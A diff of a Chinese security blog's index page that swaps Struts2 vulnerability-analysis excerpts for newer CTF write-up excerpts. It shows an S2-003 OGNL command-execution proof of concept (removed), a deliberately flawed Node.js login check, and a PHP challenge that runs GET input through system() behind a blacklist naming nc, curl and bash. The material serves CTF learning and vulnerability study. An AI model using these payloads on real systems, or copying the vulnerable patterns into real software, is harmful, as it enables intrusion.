@@ -300,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -319,7 +319,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url">Struts2-007漏洞分析</a></h1>
+                <a class="post-title-link" href="/2021/06/26/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" itemprop="url">通过Windows自带程序IMEWDBLD.EXE下载任意文件</a></h1>
         
 
         <div class="post-meta">
@@ -331,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-28T18:51:49+08:00">
-                2020-12-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:33+08:00">
+                2021-06-26
               </time>
             
 
@@ -363,166 +363,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  787字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成<code>OGNL</code>表达式的执行。</p>
-<p>这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致<code>OGNL</code>的语法解析。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-		<div>
-		  
-		</div>
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/24/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小维同学">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小维的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/12/24/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url">Struts2-004 漏洞分析</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T11:12:58+08:00">
-                2020-12-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  268字
+                  224字
                 </span>
               
 
@@ -560,11 +401,13 @@
 
       
         
-          <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-004" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-004</a></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>攻击者可以使用双重编码的url和相对路径来遍历目录结构并下载“静态”内容文件夹之外的文件。</p>
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境介绍</span></span><br><span class="line"><span class="string">OS</span> <span class="string">名称:</span> <span class="string">Microsoft</span> <span class="string">Windows</span> <span class="number">10</span> <span class="string">专业版</span></span><br><span class="line"><span class="string">OS</span> <span class="string">版本:</span> <span class="number">10.0</span><span class="number">.18363</span> <span class="string">暂缺</span> <span class="string">Build</span> <span class="number">18363</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/24/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -617,7 +460,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/24/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -636,7 +479,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/24/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url">Struts2-003、005漏洞分析</a></h1>
+                <a class="post-title-link" href="/2021/06/26/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node/" itemprop="url">记又一次CTF拉练-Node.js</a></h1>
         
 
         <div class="post-meta">
@@ -648,8 +491,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T11:11:58+08:00">
-                2020-12-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:33+08:00">
+                2021-06-26
               </time>
             
 
@@ -680,7 +523,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  860字
+                  949字
                 </span>
               
 
@@ -696,7 +539,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3分钟
+                  4分钟
                 </span>
               
             </div>
@@ -718,12 +561,14 @@
 
       
         
-          <h3 id="Struts2-003"><a href="#Struts2-003" class="headerlink" title="Struts2-003"></a>Struts2-003</h3><h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
-<p>POC:</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">login</span><span class="selector-class">.action</span>?(<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003dfalse'</span>)(bla)(bla)<span class="selector-tag">&amp;</span>(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'</span>calc\<span class="string">')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure>
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记述了又一次的CTF拉练，Node.js的白盒审计题…</p>
+<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 捕捉全局异常</span></span><br><span class="line">process.on(<span class="string">'uncaughtException'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Caught exception: '</span>, err);</span><br><span class="line">&#125;);  </span><br><span class="line"></span><br><span class="line"><span class="comment">////引入模块</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>) </span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line"><span class="keyword">var</span> marked = <span class="built_in">require</span>(<span class="string">'marked'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">var</span> AccessControl = <span class="built_in">require</span>(<span class="string">'express-ip-access-control'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = process.env.PORT;</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"><span class="keyword">var</span> sourceCode;</span><br><span class="line"></span><br><span class="line">marked.setOptions(&#123;</span><br><span class="line">    highlight: <span class="function"><span class="keyword">function</span> (<span class="params">code</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>(<span class="string">'highlight.js'</span>).highlightAuto(code).value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统文件读写操作</span></span><br><span class="line">fs.readFile(<span class="string">'app.js'</span>, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        markdown = <span class="string">`\`\`\`node\n<span class="subst">$&#123;data&#125;</span>\n\`\`\``</span>;</span><br><span class="line">        sourceCode = marked(markdown);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">    mode: <span class="string">'allow'</span>,</span><br><span class="line">    denys: [],</span><br><span class="line">    allows: [<span class="string">'10.0.0.6'</span>],</span><br><span class="line">    forceConnectionAddress: <span class="literal">false</span>,</span><br><span class="line">    log: <span class="function"><span class="keyword">function</span> (<span class="params">clientIp, access</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!access)</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;clientIp&#125;</span> denied.`</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    statusCode: <span class="number">404</span>,</span><br><span class="line">    redirectTo: <span class="string">''</span>,</span><br><span class="line">    message: <span class="string">'404 Not Found...Don\'t fuck me Please......'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问控制'express-ip-access-control'</span></span><br><span class="line">app.use(AccessControl(options));</span><br><span class="line"><span class="comment">// 设置views文件夹，应用程序视图目录 ejs后缀</span></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>);</span><br><span class="line"><span class="comment">//public下所有文件都会以静态资料文件形式返回（如样式、脚本、图片素材等文件）</span></span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//session</span></span><br><span class="line">app.use(session(&#123; <span class="attr">secret</span>: <span class="string">'ctf'</span>, <span class="attr">resave</span>: <span class="literal">true</span>, <span class="attr">saveUninitialized</span>: <span class="literal">true</span>, <span class="attr">name</span>: <span class="string">'SID'</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">//morgan日志格式化 自定义format名ctf</span></span><br><span class="line">morgan.format(<span class="string">'ctf'</span>, <span class="string">'[ctf] [:remote-addr/:req[x-forwarded-for]] - ":method :url HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent"'</span>);</span><br><span class="line">app.use(morgan(<span class="string">'ctf'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置body-parser中间件  application/x-www-form-urlencoded，extended: true 任何数据类型 设置数据限制100mb  参数限制1000000</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">limit</span>: <span class="string">'100mb'</span>, <span class="attr">extended</span>: <span class="literal">true</span>, <span class="attr">parameterLimit</span>: <span class="number">1000000</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网站根路径</span></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(sourceCode);</span></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;<span class="attr">code</span>: sourceCode&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间件处理</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 判断url中是否有/login 或者 session值是否未定义</span></span><br><span class="line">    <span class="keyword">if</span> (isProtectUrl(req.originalUrl, req.query) &amp;&amp; (<span class="keyword">typeof</span> req.session[<span class="string">'username'</span>] == <span class="string">'undefined'</span>)) &#123;</span><br><span class="line">        res.redirect(<span class="string">'/'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断url是否存在有/login</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isProtectUrl</span>(<span class="params">url, query_url</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> isProtectUrl = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> unProtectUrl = [];</span><br><span class="line">        unProtectUrl.push(<span class="string">'/login'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; unProtectUrl.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (unProtectUrl[i] == url || (url.indexOf(<span class="string">'#'</span>) &lt; <span class="number">0</span> &amp;&amp; url.indexOf(unProtectUrl[i]) &gt;= <span class="number">0</span> &amp;&amp; <span class="built_in">JSON</span>.stringify(query_url).indexOf(unProtectUrl[i]) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                isProtectUrl = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isProtectUrl</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// login页面</span></span><br><span class="line">app.get(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.render(<span class="string">'login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录post请求</span></span><br><span class="line">app.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> username = req.body[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">var</span> password = req.body[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (username == config.username &amp;&amp; password == config.password) &#123;</span><br><span class="line">        req.session[<span class="string">"username"</span>] = <span class="string">"admin"</span>;</span><br><span class="line">        res.send(<span class="string">"login success."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">'login failed.'</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// getflag页面</span></span><br><span class="line">app.get(<span class="string">'/getflag'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(config);</span></span><br><span class="line">    res.render(<span class="string">'flag'</span>, &#123;<span class="attr">flag</span>: config.flag&#125;); <span class="comment">//加载flag</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 侦听</span></span><br><span class="line">app.listen(port, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`ksctf app listening at http://0.0.0.0:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/24/Struts2-003%E3%80%81005%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/%E8%AE%B0%E5%8F%88%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-node/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -776,7 +621,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/24/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -795,7 +640,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/24/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url">Struts2-002 漏洞分析</a></h1>
+                <a class="post-title-link" href="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" itemprop="url">记一次CTF拉练-命令执行绕过</a></h1>
         
 
         <div class="post-meta">
@@ -807,8 +652,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T11:10:58+08:00">
-                2020-12-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-26T17:09:32+08:00">
+                2021-06-26
               </time>
             
 
@@ -839,7 +684,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  783字
+                  601字
                 </span>
               
 
@@ -855,7 +700,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3分钟
+                  2分钟
                 </span>
               
             </div>
@@ -877,13 +722,14 @@
 
       
         
-          <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-002</a></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>通过官网的安全公告，我们大概知道问题是出在标签<code>&lt;s:url&gt;</code>和 <code>&lt;s:a&gt;</code>标签</p>
-<p>中，如下是我们的<code>index.jsp</code>代码</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;s2-002&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;h2&gt;s2-002 demo&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/dispaly/WW/S2-002"</span>&gt;</span><br><span class="line">  &lt;/a&gt;https://cwiki.apache.org/confluence/dispaly/WW/S2-002 &lt;/p&gt;</span><br><span class="line">  &lt;s:url action="login" includeParams="all" &gt;&lt;/s:url&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+          <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记述了一次CTF拉练的一道php的白盒审计题…</p>
+<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line">$filter = <span class="string">'/#|`| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\&#123;|\&#125;|\&gt;|\&lt;|\?|\'|"|\*|;|\||&amp;|\/|\\\\/is'</span>; <span class="comment">#定义黑名单</span></span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>]; <span class="comment"># get方式传递数据</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match($filter, $cmd))&#123; <span class="comment"># 正则匹配并判断传递的数据</span></span><br><span class="line">    system($cmd.<span class="string">"echo 'okkkkkk'"</span>); <span class="comment">#执行外部程序，并显示输出</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ohhhhnnnoooooooooo....."</span>); <span class="comment">#输出一条消息，并退出当前脚本。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/12/24/Struts2-002-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
+            <a class="btn" href="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -936,7 +782,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/24/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/06/26/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -955,7 +801,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/12/24/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url">Struts2-001 漏洞分析</a></h1>
+                <a class="post-title-link" href="/2021/06/26/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/" itemprop="url">解决国内无法访问 *.github.io</a></h1>
         
 
         <div class="post-meta">
